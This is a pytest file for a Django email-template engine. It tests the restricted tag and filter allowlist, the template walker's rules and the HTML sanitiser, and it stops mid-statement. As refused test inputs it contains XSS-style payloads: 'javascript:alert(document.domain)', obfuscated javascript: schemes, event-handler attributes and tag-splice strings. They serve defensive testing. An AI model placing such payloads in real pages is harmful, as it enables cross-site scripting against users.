"""Rendering message templates: the restricted engine, the walker, prepare(), the passes, preview and its read."""

from __future__ import annotations

import asyncio
import datetime
import inspect
import logging
import re
import threading
import time
import zoneinfo
from collections.abc import Iterable
from decimal import Decimal
from html.parser import HTMLParser
from pathlib import Path
from typing import Any

import pytest
import yaml
from asgiref.sync import sync_to_async
from django.contrib.auth.models import AnonymousUser
from django.core.exceptions import ValidationError
from django.template import Engine, TemplateSyntaxError
from django.template.base import DebugLexer, Node, Parser, tag_re
from django.template.defaulttags import TemplateLiteral
from django.utils import timezone
from django.utils.safestring import SafeString, mark_safe
from hypothesis import HealthCheck, example, given, settings
from hypothesis import strategies as st
from rebac import system_context

from angee.base.models.identity import public_id_of
from angee.brandkit.testing.models import BrandKit
from angee.graphql.testing.documents import execute_schema, result_data
from angee.messaging_templates import schema as messaging_templates_schema
from angee.messaging_templates.engine import (
    ALLOWED_FILTERS,
    ALLOWED_TAGS,
    RENDER_BUDGET,
    MessageTemplateEngine,
    RenderBudget,
    RenderBudgetExceeded,
    register,
    url,
)
from angee.messaging_templates.testing.models import MessageTemplate
from angee.messaging_templates.walker import (
    LINK_ATTRIBUTES,
    OUTPUT_ATTRIBUTES,
    WALKED_NODES,
    RowPiece,
    TemplateWalk,
    TemplateWalker,
    TemplateWarning,
    TemplateWarningCode,
    _frame,
    _RowRules,
    _Tree,
    _TreeWalker,
    check_html,
    compiled_expression,
    walked,
)
from tests.conftest import addon_schema, create_platform_admin, create_user

ROOT = Path(__file__).resolve().parents[1]
ANGEE: dict[str, Any] = {
    name: value
    for name, value in yaml.safe_load((ROOT / "src/angee/brandkit/resources/install/010_brandkit.brandkit.yaml")
                                      .read_text())[0].items()
    if name != "xref"
}

PLAIN_LAYOUT = (
    '<html lang="{{ lang }}" dir="{{ dir }}"><head><title>{{ subject }}</title></head><body>'
    '<div style="display:none">{{ preheader }}</div>{% block content %}{% endblock %}</body></html>'
)
PLAIN_TEXT = "{% block content %}{% endblock %}"

_DEFAULTS: dict[str, dict[str, Any]] = {
    "layout": {"format": "html", "source": PLAIN_LAYOUT, "text_source": PLAIN_TEXT},
    "template": {"format": "markdown", "source": "Hello.", "subject": "A subject", "preheader": "A preheader",
                 "layout": "plain"},
    "block": {"format": "html", "source": "<p>Block</p>", "text_source": "Block"},
    "part": {"format": "markdown", "source": "Part."},
}


def _unsaved(kind: str = "template", key: str = "tests.mail", language: str = "en", **values: Any) -> Any:
    return MessageTemplate(kind=kind, key=key, language=language, **{"name": key, **_DEFAULTS[kind], **values})


def _row(kind: str = "template", key: str = "tests.mail", language: str = "en", **values: Any) -> Any:
    """Save a row as named system work, past ``clean``: what a render meets when a write skipped the walk."""

    row = _unsaved(kind, key, language, **values)
    with system_context(reason="tests.messaging_templates.render.setup"):
        row.save()
    return row


def _refusals(row: Any, *, saving: bool = True) -> list[str]:
    with system_context(reason="tests.messaging_templates.render.walk"):
        try:
            TemplateWalker(saving=saving).walk(row, MessageTemplate.objects)
        except ValidationError as error:
            return list(error.messages)
    return []


def _walk(row: Any) -> TemplateWalk:
    with system_context(reason="tests.messaging_templates.render.walk"):
        return TemplateWalker().walk(row, MessageTemplate.objects)


def _render(row: Any, values: dict[str, Any], kit: Any = None) -> Any:
    with system_context(reason="tests.messaging_templates.render"):
        return row.render(values, kit=kit)


@pytest.fixture
def kit(db: None) -> Any:
    del db
    with system_context(reason="tests.messaging_templates.render.kit"):
        return BrandKit.objects.create(**{**ANGEE, "name": "Acme", "is_default": True})


@pytest.fixture
def plain(kit: Any) -> Any:
    """A minimal layout, the default kit beside it."""

    del kit
    return _row("layout", "plain")


def _mail(source: str, variables: dict[str, str] | None = None, **values: Any) -> Any:
    return _row("template", values.pop("key", "tests.mail"), variables=variables or {}, source=source, **values)


# ---------- the engine ----------

T01_REFUSED = (
    "{% load static %}", "{% debug %}", "{% url 'x' %}", "{% csrf_token %}", "{% autoescape off %}x{% endautoescape %}",
    "{% now 'Y' %}", "{% lorem %}", "{% filter upper %}x{% endfilter %}", "{% cycle 'a' 'b' %}", "{% firstof a b %}",
    "{% widthratio a b 100 %}", "{% spaceless %}x{% endspaceless %}", "{% verbatim %}{{ x }}{% endverbatim %}",
    "{% regroup a by b as c %}", "{% ifchanged %}x{% endifchanged %}", "{% querystring %}",
    "{% partialdef p %}x{% endpartialdef %}", "{% partial p %}", "{% csp_nonce_attr %}", "{% resetcycle %}",
    "{% translate 'x' %}", "{% blocktranslate %}x{% endblocktranslate %}",
    "{{ x|safe }}", "{{ x|safeseq }}", "{{ x|escapejs }}", "{{ x|add:'1' }}", "{{ x|stringformat:'s' }}",
    "{{ x|urlize }}", "{{ x|ljust:'9' }}", "{{ x|cut:'a' }}", "{{ x|json_script:'i' }}", "{{ x|dictsort:'a' }}",
    "{{ x|random }}", "{{ x|wordwrap:5 }}", "{{ x|escape }}", "{{ x|force_escape }}", "{{ x|striptags }}",
    "{{ x|timesince }}", "{{ x|join:',' }}", "{{ x|first }}", "{{ x|last }}", "{{ x|default_if_none:'a' }}",
    "{% include name only %}", "{% include 'blocks/x' %}", "{% extends name %}", "{% include 'a'|lower only %}",
)


def test_the_engine_registers_exactly_the_allowlist_and_compiles_nothing_else() -> None:
    engine = MessageTemplateEngine(autoescape=True)
    parser = Parser([], engine.template_libraries, engine.template_builtins)
    assert sorted(parser.tags) == sorted(ALLOWED_TAGS)
    assert sorted(parser.filters) == sorted(ALLOWED_FILTERS)
    assert engine.template_libraries == {}
    assert engine.context_processors == []
    for source in T01_REFUSED:
        with pytest.raises(TemplateSyntaxError):
            engine.from_string(source)


GUARD_TEMPLATE = (
    '<p>{% include "parts/guard" with who=person.name only %}'
    "{% if count > 1 and flag or not flag %}a{% elif name == 'x' %}b{% elif count >= 2 %}{% elif count < 3 %}"
    "{% elif count <= 4 %}{% elif count != 5 %}{% elif name in 'abc' %}{% elif name not in 'abc' %}"
    "{% elif flag is True %}{% elif flag is not None %}{% elif ratio == 1.5 %}{% elif flag == False %}c"
    "{% elif items|length %}{% else %}d{% endif %}</p>\n"
    "<p>{% for item in items reversed %}{{ forloop.counter }}{{ item.label|default:'x'|upper|lower|capfirst }}"
    "{% empty %}none{% endfor %}{% with title=name|title %}{{ title|truncatechars:5 }}{% endwith %}"
    "{# a note #}{% comment %}x{% endcomment %}{% templatetag openvariable %}</p>\n"
    "<p>{{ note|truncatewords:2|linebreaksbr }}{{ items|length }}{{ when|date:'DATE_FORMAT' }}"
    "{{ amount|floatformat:2 }}{{ count|pluralize }}{{ flag|yesno:'y,n' }}<a href=\"{{ link|url }}\">x</a></p>"
)
GUARD_VARIABLES = {
    "person.name": "x", "count": "x", "flag": "x", "name": "x", "ratio": "x", "items.*.label": "x", "note": "x",
    "when": "x", "amount": "x", "link": "x",
}
GUARD_NODES = {
    "TextNode": ((), ["s"]),
    "VariableNode": ((), ["filter_expression"]),
    "IfNode": (("nodelist",), ["conditions_nodelists"]),
    "ForNode": (("nodelist_loop", "nodelist_empty"),
                ["is_reversed", "loopvars", "nodelist_empty", "nodelist_loop", "sequence"]),
    "BudgetedLoopBody": (("nodelist",), ["nodelist"]),
    "WithNode": (("nodelist",), ["extra_context", "nodelist"]),
    "CommentNode": ((), []),
    "BudgetedIncludeNode": (("nodelist",), ["extra_context", "isolated_context", "template"]),
    "ExtendsNode": (("nodelist",), ["blocks", "nodelist", "parent_name", "template_dirs"]),
    "BlockNode": (("nodelist",), ["name", "nodelist", "parent"]),
    "TemplateTagNode": (("nodelist",), ["tagtype"]),
}
GUARD_FILTERS = {
    "capfirst": ((True, None, None), "(value)"),
    "date": ((False, None, True), "(value, arg=None)"),
    "default": ((False, None, None), "(value, arg)"),
    "floatformat": ((True, None, None), "(text, arg=-1)"),
    "length": ((False, None, None), "(value)"),
    "linebreaksbr": ((True, True, None), "(value, autoescape=True)"),
    "lower": ((True, None, None), "(value)"),
    "pluralize": ((False, None, None), "(value, arg='s')"),
    "title": ((True, None, None), "(value)"),
    "truncatechars": ((True, None, None), "(value, arg)"),
    "truncatewords": ((True, None, None), "(value, arg)"),
    "upper": ((False, None, None), "(value)"),
    "url": ((False, None, None), "(value: 'Any') -> 'str'"),
    "yesno": ((False, None, None), "(value, arg=None)"),
}


def test_walker_reads_every_node(plain: Any, kit: Any) -> None:
    """The guard every Django upgrade runs: the nodes, attributes, operators, filters and lexer the walker reads."""

    del plain
    _row("block", "guard", source="<b>{{ who }}{{ brand.name }}{{ lang }}</b>", text_source="{{ who }}",
         variables={"who": "x"})
    _row("part", "guard", source='{% include "blocks/guard" with who=who only %}', variables={"who": "x"})
    template = _mail(GUARD_TEMPLATE, GUARD_VARIABLES, format="html", text_source="{{ name }}")
    walk = _walk(template)
    engines = {"html": MessageTemplateEngine(autoescape=True), "text": MessageTemplateEngine(autoescape=False)}
    met: dict[str, tuple[tuple[str, ...], list[str]]] = {}
    operators: set[str] = set()

    def conditions(condition: Any) -> None:
        operators.add(condition.id)
        if type(condition) is not TemplateLiteral:
            for operand in (condition.first, condition.second):
                if operand is not None:
                    conditions(operand)

    for forms in walk.forms.values():
        for form, engine in engines.items():
            for node in engine.from_string(getattr(forms, form)).nodelist.get_nodes_by_type(Node):
                met[type(node).__name__] = (
                    type(node).child_nodelists, sorted(set(vars(node)) - {"token", "origin"}),
                )
                # The walker's table renders what Django renders under each node.
                assert [child for nodelist in walked(node).nodelists(node) for child in nodelist] == [
                    child for name in type(node).child_nodelists for child in getattr(node, name, None) or ()
                ], type(node)
                for condition, _ in getattr(node, "conditions_nodelists", ()):
                    if condition is not None:
                        conditions(condition)
    assert met == GUARD_NODES
    assert set(GUARD_NODES) == {node.__name__ for node in WALKED_NODES}
    assert operators == {"or", "and", "not", "in", "not in", "is", "is not", "==", "!=", ">", ">=", "<", "<=",
                         "literal"}
    assert {
        name: (tuple(getattr(function, flag, None) for flag in ("is_safe", "needs_autoescape", "expects_localtime")),
               str(inspect.signature(inspect.unwrap(function))))
        for name, function in register.filters.items()
    } == GUARD_FILTERS
    assert tag_re.pattern == r"({%.*?%}|{{.*?}}|{#.*?#})"
    assert [(token.token_type.name, token.position) for token in DebugLexer(
        "Hi {{ a }}{% if b %}c{% endif %}{# d #}").tokenize()] == [
        ("TEXT", (0, 3)), ("VAR", (3, 10)), ("BLOCK", (10, 20)), ("TEXT", (20, 21)), ("BLOCK", (21, 32)),
        ("COMMENT", (32, 39)),
    ]
    # An include inside an included row still reads the globals: new() reads them from the copy of the context.
    rendered = _render(template, {"person": {"name": "Ana"}, "count": 2, "flag": True, "name": "x", "ratio": 1.5,
                                  "items": [{"label": "a"}], "note": "n", "when": "2026-11-24", "amount": "3.14159",
                                  "link": "https://example.test/"}, kit)
    assert "<b>AnaAcmeen</b>" in rendered.html and "{{" in rendered.html
    # Another node class is a defect to fix in the walker, never a refusal.
    spaceless = Engine().from_string("{% spaceless %}x{% endspaceless %}").nodelist[0]
    with pytest.raises(TypeError, match="does not know SpacelessNode"):
        _RowRules([], "probe", text_form=False).node(spaceless)
    tree_walker = _TreeWalker(walk, {})
    with pytest.raises(TypeError, match="does not know SpacelessNode"):
        tree_walker.node(_frame("probe", template, RowPiece.HTML, top=True), spaceless, _Tree(RowPiece.HTML))


# ---------- the walker's refusals, one rule at a time ----------

LONG = "a" * 1_001


@pytest.mark.parametrize(
    ("values", "refusal"),
    [
        pytest.param({"source": "x" * 50_001}, "source is over 50000 characters", id="1-source-size"),
        pytest.param({"source": LONG}, "a line of source is over 1000", id="1-line-length"),
        pytest.param({"source": "{{ a }}" * 31, "variables": {"a": "x"}}, "or holds over 30", id="1-line-openers"),
        pytest.param({"source": "[" * 31}, "holds over 30 [", id="1-markdown-brackets"),
        pytest.param({"source": ("&#123;&#123;" * 83)[:999]}, "html form holds over 60", id="1-form-openers"),
        pytest.param({"source": "\n".join(["{% if a %}"] * 17) + "\n" + "\n".join(["{% endif %}"] * 17),
                      "variables": {"a": "x"}}, "nests tags over 16 deep", id="2-nesting"),
        pytest.param({"source": "{% if %}{% endif %}"}, "does not compile", id="3-compile"),
        pytest.param({"source": '{{ "<b>" }}'}, "holds <, > or", id="4-literal-markup"),
        pytest.param({"source": '{{ "' + "a" * 201 + '" }}'}, "a literal over 200", id="4-literal-length"),
        pytest.param({"source": '{{ _("Hi") }}'}, "_(…)", id="4-translation"),
        pytest.param({"source": "{{ a|truncatechars:n }}", "variables": {"a": "x", "n": "x"}},
                     "takes a literal argument", id="5-variable-argument"),
        pytest.param({"source": "{{ a|lower|upper|lower|upper|lower }}", "variables": {"a": "x"}},
                     "over 4 filters", id="5-filter-count"),
        pytest.param({"source": "{{ a|floatformat:7 }}", "variables": {"a": "x"}}, "precision 7", id="5-precision"),
        pytest.param({"source": "{{ a|date:'rrrrrrrrrrrrrrrrrrrrr' }}", "variables": {"a": "x"}},
                     "a date format", id="5-date-format"),
        pytest.param({"source": "{{ a|upper|date }}", "variables": {"a": "x"}}, "date is the first", id="5-date-first"),
        pytest.param({"source": "{{ a|url|upper }}", "variables": {"a": "x"}}, "url is the last", id="5-url-last"),
        pytest.param({"source": "{{ a|upper|url }}", "variables": {"a": "x"}}, "url is the last", id="5-url-after"),
        pytest.param({"source": "{{ order|upper }}", "variables": {"order.total": "x"}},
                     "filters an object or a list", id="5-container-filter"),
        pytest.param({"source": "{{ a|linebreaksbr:'x' }}", "variables": {"a": "x"}, "format": "html",
                      "text_source": "x"}, "linebreaksbr takes no argument", id="5-linebreaksbr-argument"),
        pytest.param({"source": "a {{ b", "format": "html", "text_source": "x"}, "text holds {{", id="6-text-opener"),
        pytest.param({"source": "<p>{{ a }}</p>", "format": "html", "text_source": "{{ a|linebreaksbr }}",
                      "variables": {"a": "x"}}, "writes <br> into plain text", id="7-linebreaksbr-text"),
        pytest.param({"source": "Hi{% endblock %}{% block x %}X"}, "a template writes neither", id="8-author-block"),
        pytest.param({"subject": '{% include "parts/x" only %}'}, "not used in a subject", id="8-subject-include"),
        pytest.param({"source": '{% include "layouts/plain" only %}'}, "only blocks and parts", id="9-include-kind"),
        pytest.param({"source": '{% include "blocks/missing" only %}'}, "no message template blocks/missing",
                     id="9-missing-row"),
        pytest.param({"source": "{% for a, b in items %}{% endfor %}", "variables": {"items.*": "x"}},
                     "one loop variable", id="10-loop-variables"),
        pytest.param({"source": "{% for a in items|lower %}{% endfor %}", "variables": {"items.*": "x"}},
                     "not a filtered one", id="10-filtered-sequence"),
        pytest.param({"source": "{% for a in order %}{% endfor %}", "variables": {"order.total": "x"}},
                     "for loops over a list", id="10-object-sequence"),
        pytest.param({"source": "{% if a|upper %}{% endif %}", "variables": {"a": "x"}}, "an if tests",
                     id="11-filtered-operand"),
        pytest.param({"source": "{% if order %}{% endif %}", "variables": {"order.total": "x"}}, "an if tests",
                     id="11-container-operand"),
        pytest.param({"source": "{% if a in items %}{% endif %}", "variables": {"a": "x", "items.*": "x"}},
                     "in takes a literal", id="11-in-value"),
        pytest.param({"source": "<script>x</script>", "format": "html", "text_source": "x"},
                     "<script> is not allowed", id="12-html"),
        pytest.param({"source": "Use `{{ a }}` here.", "variables": {"a": "x"}}, "inside Markdown code inline",
                     id="12-markdown"),
        pytest.param({"source": "{{ secret }}"}, "secret is not in its variables", id="13-undeclared"),
        pytest.param({"source": "{{ forloop.counter }}"}, "outside a loop", id="13-forloop-outside"),
        pytest.param({"source": "{% for i in items %}{{ forloop.parentloop }}{% endfor %}",
                      "variables": {"items.*": "x"}}, "forloop.parentloop is not a value", id="13-forloop-key"),
        pytest.param({"source": "{% for i in items %}{{ forloop }}{% endfor %}", "variables": {"items.*": "x"}},
                     "prints an object or a list", id="13-forloop-bare"),
        pytest.param({"source": "{{ brand.secret }}"}, "brand.secret is not a value", id="13-brand"),
        pytest.param({"source": "{% with b=brand.light %}{{ b.nothing }}{% endwith %}"},
                     "brand.light.nothing is not a value", id="13-brand-alias"),
        pytest.param({"source": "{{ lang.code }}"}, "looks up inside lang", id="13-global-lookup"),
        pytest.param({"source": "{{ True.real }}"}, "looks up inside True", id="13-constant-lookup"),
        pytest.param({"source": "{{ block.super }}"}, "the engine's own", id="13-block"),
        pytest.param({"source": "{{ name.upper }}", "variables": {"name": "x"}}, "name.upper is not in its",
                     id="15-below-leaf"),
        pytest.param({"source": "{% with a='x' %}{{ a.b }}{% endwith %}"}, "looks up inside a", id="15-literal"),
        pytest.param({"source": "{% with a=n|lower %}{{ a.b }}{% endwith %}", "variables": {"n": "x"}},
                     "looks up inside a", id="15-computed"),
        pytest.param({"source": "{{ order }}", "variables": {"order.total": "x"}}, "prints an object or a list",
                     id="16-container-output"),
        pytest.param({"source": "{% with brand=a %}{% endwith %}", "variables": {"a": "x"}},
                     "brand is a name the mail", id="18-reserved"),
        pytest.param({"source": "{% with True=a %}{% endwith %}", "variables": {"a": "x"}},
                     "True is a name the mail", id="18-constant"),
        pytest.param({"source": "{% for lang in items %}{% endfor %}", "variables": {"items.*": "x"}},
                     "lang is a name the mail", id="18-loop-variable"),
        pytest.param({"source": "{% for i in items %}{% for j in items %}{% for k in items %}{% endfor %}{% endfor %}"
                                "{% endfor %}", "variables": {"items.*": "x"}}, "loops nest over 2",
                     id="18-loop-depth"),
        pytest.param({"source": "\n".join(["{{ a }}" * 25] * 13), "format": "html", "text_source": "x",
                      "variables": {"a": "x"}}, "over 300 outputs", id="18-outputs"),
    ],
)
def test_the_walker_refuses_each_rule(plain: Any, values: dict[str, Any], refusal: str) -> None:
    del plain
    refusals = _refusals(_unsaved(**values))
    assert any(refusal in message for message in refusals), refusals


def test_a_walk_refuses_through_what_a_template_reaches(plain: Any) -> None:
    """Rules 14, 17 and 18: effective paths, arguments, cycles and the depth of includes and rows."""

    del plain
    _row("part", "named", source="{{ person.first_name }} {{ person.last_name|default:'' }}",
         variables={"person.first_name": "x", "person.last_name": "x"})
    _row("part", "loops", source="{% include \"parts/loops\" only %}")
    _row("part", "leaks", source="{{ secret }}", variables={"secret": "x"})
    _row("part", "one", source='{% include "parts/two" only %}')
    _row("part", "two", source='{% include "parts/three" only %}')
    _row("part", "three", source='{% include "parts/four" only %}')
    _row("part", "four", source="Four.")
    cases = {
        "14-effective": ('{% include "parts/named" with person=recipient only %}', {"recipient.first_name": "x"},
                         "recipient.last_name is not a value the render declares"),
        "17-undeclared-argument": ('{% include "parts/named" with person=recipient other=recipient only %}',
                                   {"recipient.first_name": "x", "recipient.last_name": "x"},
                                   "passes other to parts/named"),
        "17-not-passed": ('{% include "parts/leaks" only %}', {}, "which it was not passed"),
        "18-cycle": ('{% include "parts/loops" only %}', {}, "includes itself"),
        "18-include-depth": ('{% include "parts/one" only %}', {}, "includes nest over 3"),
    }
    for case, (source, variables, refusal) in cases.items():
        refusals = _refusals(_unsaved(source=source, variables=variables))
        assert any(refusal in message for message in refusals), (case, refusals)
    assert _refusals(_unsaved(source='{% include "parts/two" only %}')) == []


def test_saving_asks_every_included_key_to_resolve_and_a_render_asks_only_for_a_row(plain: Any) -> None:
    del plain
    _row("part", "local", language="es", source="Hola.")
    template = _unsaved(language="es", source='{% include "parts/local" only %}')
    assert any("parts/local has no shipped default" in message for message in _refusals(template, saving=True))
    assert _refusals(template, saving=False) == []


def test_a_saved_layout_block_or_part_walks_what_it_reaches_and_clean_walks_only_what_changed(plain: Any) -> None:
    template = _mail('{% include "parts/fine" only %}', key="tests.edit")
    part = _row("part", "fine", source="Fine.")
    with system_context(reason="tests.messaging_templates.render.edit"):
        part.source = "{% if %}"
        with pytest.raises(ValidationError, match="does not compile"):
            part.full_clean()
        part.save()  # past clean: the part is broken now
        template.name = "Renamed"
        template.full_clean()  # what renders did not change, so the walk does not run
        template.source = '{% include "parts/fine" only %}\n\nMore.'
        with pytest.raises(ValidationError, match="parts/fine"):
            template.full_clean()
        plain.description = "Plain."
        plain.full_clean()


# ---------- the HTML checks ----------

HTML_ENGINE = MessageTemplateEngine(autoescape=True)


@pytest.mark.parametrize(
    ("html", "refused"),
    [
        *(pytest.param(f"<{tag}></{tag}>", True, id=f"element-{tag}")
          for tag in ("script", "iframe", "object", "embed", "form", "link", "base", "svg", "math")),
        pytest.param('<meta http-equiv="refresh" content="0">', True, id="http-equiv"),
        pytest.param('<p onclick="x">x</p>', True, id="on-attribute"),
        *(pytest.param(f'<img {name}="x">', True, id=f"attribute-{name}")
          for name in ("srcset", "background", "poster", "action", "formaction", "xlink:href", "cite")),
        *(pytest.param(f"<p>a</p><{tag}>b</{tag}>", True, id=f"s3-{tag}")
          for tag in ("noscript", "xmp", "noembed", "noframes", "plaintext", "textarea")),
        pytest.param('<noscript><p title="</noscript><b title={{ a }}>"></p></noscript>', True,
                     id="s3-noscript-splice"),
        pytest.param('<xmp><p title="</xmp><b title={{ a }}>"></p></xmp>', True, id="s3-xmp-splice"),
        pytest.param('<span title="a" title={{ a }}>x</span>', True, id="s1-repeated-name-unquoted"),
        pytest.param('<span title="a" title="{{ a }}">x</span>', True, id="s1-repeated-name"),
        pytest.param('<span TITLE="a" title={{ a }}>x</span>', True, id="s1-repeated-name-in-capitals"),
        pytest.param('<a href="https://example.test/" href={{ a|url }}>x</a>', True, id="s1-repeated-href"),
        pytest.param('<p TITLE="{{ a }}">x</p>', True, id="s1-capital-name"),
        pytest.param('<p title = "{{ a }}">x</p>', True, id="s1-spaced-equals"),
        pytest.param('<p title="{{ a }}" >x</p>', True, id="s1-space-before-close"),
        pytest.param('<a\nhref="https://example.test/"\ntitle="{{ a }}">x</a>', True, id="s1-newlines"),
        pytest.param('<p title="a&b {{ a }}">x</p>', True, id="s1-bare-ampersand"),
        pytest.param('<p title="a &amp; b {{ a }}">x</p>', False, id="s1-admitted-escaped"),
        pytest.param('<img alt="{{ a }}" src="https://example.test/a.png" />', False, id="s1-admitted-self-closing"),
        pytest.param('<td nowrap title="{{ a }}">x</td>', False, id="s1-admitted-bare-attribute"),
        pytest.param("<title>{% include 'parts/p' only %}</title>", True, id="title-element-include"),
        pytest.param("<title>{% for a in b %}{{ a }}{% endfor %}</title>", True, id="title-element-for"),
        pytest.param("<title>{{ subject }}{% if a %} {{ a }}{% endif %}</title>", False, id="admitted-title-element"),
        pytest.param("<{{ tag }}>x</{{ tag }}>", True, id="span-starts-a-tag"),
        pytest.param("<a{{ tag }}>x</a>", True, id="span-in-a-tag-name"),
        pytest.param('<p {{ name }}="x">x</p>', True, id="span-in-an-attribute-name"),
        pytest.param("<p title={{ a }}>x</p>", True, id="unquoted"),
        pytest.param("<p title='{{ a }}'>x</p>", True, id="single-quoted"),
        pytest.param("<!-- note -->", True, id="comment"),
        pytest.param("<!--[if mso]><b>x</b><![endif]-->", True, id="conditional-comment-outside-a-layout"),
        pytest.param("<xml><o:OfficeDocumentSettings></o:OfficeDocumentSettings></xml>", True, id="office-outside"),
        pytest.param("<v:rect></v:rect>", True, id="vml"),
        pytest.param('<a href="{{ a|url }}{{ b|url }}">x</a>', True, id="href-two-outputs"),
        pytest.param('<a href="{{ a }}">x</a>', True, id="href-without-url"),
        pytest.param('<a href="https://x.test/{{ a|url }}">x</a>', True, id="href-text-and-output"),
        pytest.param('<a href="javascript:alert(1)">x</a>', True, id="href-javascript"),
        pytest.param('<img src="data:image/png;base64,AAAA">', True, id="src-data"),
        pytest.param('<p style="color:{{ a }}">x</p>', True, id="style-value"),
        pytest.param('<p style="color:{{ brand.light.text|upper }}">x</p>', True, id="style-filter"),
        pytest.param('<p style="font:{{ brand.name }}">x</p>', True, id="style-brand-name"),
        pytest.param("<style>a{color:{{ brand.font.body }}}</style>", True, id="style-element-font"),
        pytest.param('<p class="{{ a }}">x</p>', True, id="class-output"),
        pytest.param('<p title="{% for a in b %}{% endfor %}">x</p>', True, id="title-for"),
        pytest.param('<p title="{% if a %}">x</p><b title="{% endif %}">y</b>', True, id="if-splice"),
        pytest.param("<?php x ?>", True, id="processing-instruction"),
        pytest.param('<a href="{{ a|url }}" title="{{ a }}">x</a>', False, id="admitted-link"),
        pytest.param('<a href="{{ a|default:\'\'|url }}">x</a>', False, id="admitted-default-url"),
        pytest.param('<a href="https://example.test/">x</a>', False, id="admitted-static-link"),
        pytest.param('<p style="color:{{ brand.light.text }};font:16px {{ brand.font.body }};direction:{{ dir }}">'
                     "x</p>", False, id="admitted-style"),
        pytest.param("<style>.x{color:{{ brand.dark.text }}}</style>", False, id="admitted-style-element"),
        pytest.param('<p title="{% if a %}{{ a }}{% else %}b{% endif %}" lang="{{ lang }}">x</p>', False,
                     id="admitted-condition"),
        pytest.param('<td style="text-align:{% if dir == \'rtl\' %}right{% else %}left{% endif %}">x</td>', False,
                     id="admitted-style-condition"),
        pytest.param("<!doctype html><html><body>{{ a }}</body></html>", False, id="admitted-doctype"),
    ],
)
def test_the_html_checks(html: str, refused: bool) -> None:
    assert bool(check_html(html, compiled_expression(HTML_ENGINE))) is refused, check_html(
        html, compiled_expression(HTML_ENGINE))


@pytest.mark.parametrize(
    ("ending", "refused"),
    [
        ("<a", True), ('<a href="https://example.test/"', True), ('<a title="x', True), ("<a href=", True),
        ("<style>", True), ("<style>.a{", True), ("<title>", True), ("<!--", True), ("<!", True), ("</", True),
        ("&am", True), ("<b><i>", False), ("", False),
    ],
)
def test_a_form_ends_where_it_started(ending: str, refused: bool) -> None:
    """S2 (i3): html.parser drops an unfinished tag at the end and never closes <style>; a form ends in text."""

    refusals = check_html("<p>x</p>" + ending, compiled_expression(HTML_ENGINE))
    assert any("it ends inside" in refusal for refusal in refusals) is refused, refusals


def test_a_row_cannot_leave_the_next_row_inside_a_tag_or_a_style(plain: Any, kit: Any) -> None:
    """S2 (a1, a2): a block ending inside a tag or a <style> is refused, so no template's value lands there."""

    del plain
    continuations = {
        "open_a": ("<p>Hi</p><a", ' href="{{ link }}" style="background:url({{ link }})">Open</a>'),
        "open_attribute": ('<p>Hi</p><a title="x"', ' href="{{ link }}">Open</a>'),
        "open_quote": ('<p>Hi</p><a title="x', '" href="{{ link }}">Open</a>'),
        "open_style": ("<p>Hi</p><style>", "Hello {{ link }}, welcome."),
    }
    for key, (ending, continuation) in continuations.items():
        assert any("it ends inside" in refusal for refusal in _refusals(_unsaved(
            "block", key, source=ending, text_source="x"))), key
        _row("block", key, source=ending, text_source="x")  # past clean, as a write that skipped the walk
        template = _mail(f'{{% include "blocks/{key}" only %}}{continuation}', {"link": "x"}, format="html",
                         text_source="{{ link }}", key=f"tests.{key}")
        with pytest.raises(ValidationError, match="it ends inside"):
            _render(template, {"link": "javascript:alert(document.domain)"}, kit)


def test_a_static_value_never_links_to_a_refused_scheme() -> None:
    """Fix 4 (q12): a static value reaching a scheme url refuses is refused in every attribute, as decoded."""

    expression = compiled_expression(HTML_ENGINE)
    for name in ("ping", "longdesc", "usemap", "lowsrc", "dynsrc", "data", "codebase", "manifest", "profile",
                 "archive", "itemtype", "xmlns", "title", "class"):
        for value in ("javascript:alert(1)", "JaVaScRiPt:x", " vbscript:x", "java&#9;script:x", "&#1;file:///x",
                      "data:text/html,x"):
            assert check_html(f'<img {name}="{value}">', expression), (name, value)
    assert check_html('<p title="{% if a %}javascript{% endif %}:x">x</p>', expression)
    for admitted in ('<html xmlns:v="urn:schemas-microsoft-com:vml">', '<img alt="Note: ready">',
                     '<p style="color:red;background:#fff">x</p>', '<meta content="width=device-width">'):
        assert check_html(admitted, expression) == [], admitted


OUTLOOK_DPI = (
    "<!--[if mso]><xml><o:OfficeDocumentSettings><o:PixelsPerInch>96</o:PixelsPerInch></o:OfficeDocumentSettings>"
    "</xml><![endif]-->"
)
GHOST = (
    '<!--[if mso]><table role="presentation" width="600" align="center"><tr><td><![endif]-->'
    "<table><tr><td>{{ x }}</td></tr></table><!--[if mso]></td></tr></table><![endif]-->"
)


@pytest.mark.parametrize(
    ("html", "refused"),
    [
        pytest.param(OUTLOOK_DPI, False, id="dpi"),
        pytest.param("<!--[if mso]><style>td{font-family:Arial,sans-serif !important}</style><![endif]-->", False,
                     id="font-override"),
        pytest.param(GHOST, False, id="ghost-table"),
        pytest.param("<!--[if !mso]><!--><p>{{ x }}</p><!--<![endif]-->", False, id="revealed-pair"),
        pytest.param("<!--[if mso]><b>{{ x }}</b><![endif]-->", True, id="template-code-inside"),
        pytest.param("<!--[if mso]><!-- {{ x }} --><![endif]-->", True, id="template-code-in-a-nested-comment"),
        pytest.param("<!-- note -->", True, id="plain-comment"),
        pytest.param("<!--[if gte mso 9]><b>x</b><![endif]-->", True, id="other-condition"),
        pytest.param("<!--[if mso]><v:roundrect></v:roundrect><![endif]-->", True, id="vml-button"),
        pytest.param("<!--[if mso]><script>x</script><![endif]-->", True, id="script-inside"),
        pytest.param('<!--[if mso]><p onclick="x">x</p><![endif]-->', True, id="event-inside"),
        pytest.param('<!--[if mso]><a href="javascript:x">x</a><![endif]-->', True, id="link-inside"),
        pytest.param('<!--[if mso]><a href="x<![endif]-->', True, id="ends-inside-a-tag"),
        pytest.param("<!--[if mso]><style>td{<![endif]-->", True, id="ends-inside-style"),
        pytest.param("<!--[if mso]><b>--!><p>x</p><![endif]-->", True, id="bang-close"),
        pytest.param("</<![endif]>", True, id="bogus-close"),
        pytest.param("<!--[if !mso]><!--><p>x</p>", True, id="revealed-unclosed"),
        pytest.param("<p>x</p><!--<![endif]-->", True, id="revealed-unopened"),
        pytest.param("<!--[if !mso]><!--><!--[if !mso]><!--><!--<![endif]--><!--<![endif]-->", True,
                     id="revealed-nested"),
        pytest.param("<!--[if !mso]><!-->" + OUTLOOK_DPI + "<!--<![endif]-->", True, id="mso-inside-revealed"),
    ],
)
def test_a_layout_holds_outlooks_conditional_comments_alone(html: str, refused: bool) -> None:
    """D2: a layout may carry static, balanced MSO conditional comments whose markup is checked as any other."""

    assert bool(check_html(html, compiled_expression(HTML_ENGINE), conditional_comments=True)) is refused, check_html(
